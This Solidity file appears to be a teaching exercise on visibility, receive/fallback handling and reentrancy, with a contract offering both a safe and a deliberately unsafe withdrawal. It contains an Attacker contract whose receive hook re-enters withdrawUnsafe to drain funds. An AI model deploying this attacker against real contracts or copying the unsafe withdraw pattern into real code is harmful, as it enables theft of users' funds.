// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IFirst {
    function setPublic(uint256 num) external;
    function setPrivate(uint256 num) external;
    function setInternal(uint256 num) external;
    function sum() external view returns (uint256);
    function sumFromSecond(address contractAddress) external returns (uint256);
    function callExternalReceive(address payable contractAddress) external payable;
    function callExternalFallback(address payable contractAddress) external payable;
    function getSelector() external pure returns (bytes memory);
}

interface ISecond {
    function withdrawSafe(address payable holder) external;
    function withdrawUnsafe(address payable holder) external;
}

interface IAttacker {
    function increaseBalance() external payable;
    function attack() external payable;
}

contract First is IFirst, Ownable {
    uint256 public ePublic;
    uint256 private ePrivate;
    uint256 internal eInternal;

    function setPublic(uint256 num) external onlyOwner{
        ePublic = num;
    }

    function setPrivate(uint256 num) external onlyOwner {
        ePrivate = num;
    }

    function setInternal(uint256 num) external onlyOwner {
        eInternal = num;
    }

    function sum() virtual external view returns (uint256) {
        return ePublic + ePrivate + eInternal;
    }

    function sumFromSecond(address contractAddress) external returns (uint256) {
        (bool success, bytes memory data) = contractAddress.call(abi.encodeWithSignature("sum()"));
        require(success);
        
        return abi.decode(data, (uint256));
    }

    function callExternalReceive(address payable contractAddress) public payable {
        require(msg.value == 0.0001 ether, "callExternalReceive: msg.value must be equal 0.0001 ether");

        (bool sent, ) = contractAddress.call{value: msg.value}("");
        require(sent, "callExternalReceive: ether wasn't sent");
    }
    
    function callExternalFallback(address payable contractAddress) external payable {
        require(msg.value == 0.0002 ether, "callExternalFallback: msg.value must be equal 0.0002 ether");

        (bool sent, ) = contractAddress.call{value: msg.value}("func");
        require(sent, "callExternalFallback: ether wasn't sent");
    }

    function getSelector() public pure returns (bytes memory) {
        return abi.encodePacked(
            bytes4(keccak256("callExternalFallback(address)")),
            bytes4(keccak256("callExternalReceive(address)")),
            bytes4(keccak256("ePublic()")),
            bytes4(keccak256("getSelector()")),
            bytes4(keccak256("setInternal(uint256)")),
            bytes4(keccak256("setPrivate(uint256)")),
            bytes4(keccak256("setPublic(uint256)")),
            bytes4(keccak256("sum()")),
            bytes4(keccak256("sumFromSecond(address)"))
        );
    }
}

contract Second is First, ISecond{
    mapping(address => uint256) public balance;

    function sum() override external view returns (uint256) {
        return ePublic + eInternal;
    }

    receive() external payable {
        balance[tx.origin] += msg.value;
    }

    fallback () external payable {
        balance[msg.sender] += msg.value;
    }

    function withdrawSafe(address payable holder) external {
        uint _balance = balance[holder];
        require(_balance > 0, "Less balance");

        balance[holder] = 0;

        (bool success, ) = holder.call{value: _balance}("");
        require(success, "withdrawUnsafe: ether wasn't sent");

    }

    function withdrawUnsafe(address payable holder) external {
        uint _balance = balance[holder];
        require(_balance > 0, "Less balance");

        (bool success, ) = holder.call{value: _balance}("");
        require(success, "withdrawUnsafe: ether wasn't sent");

        balance[holder] = 0;
    }
}

contract Attacker is IAttacker {
    ISecond public immutable secondContract;

    constructor(ISecond secondAddr) {
        secondContract = secondAddr;
    }

    receive() external payable {
        if (address(secondContract).balance >= 0.0001 ether) {
            secondContract.withdrawUnsafe(payable(address(this)));
        }
    }

    function increaseBalance() external payable {
        (bool sent, ) = address(secondContract).call{value: msg.value}("somedata");
        require(sent);
    }

    function attack() external payable {
        require(msg.value == 0.0001 ether, "Require 0.0001 Ether to attack");
        this.increaseBalance();
        secondContract.withdrawUnsafe(payable(address(this)));
    }
}

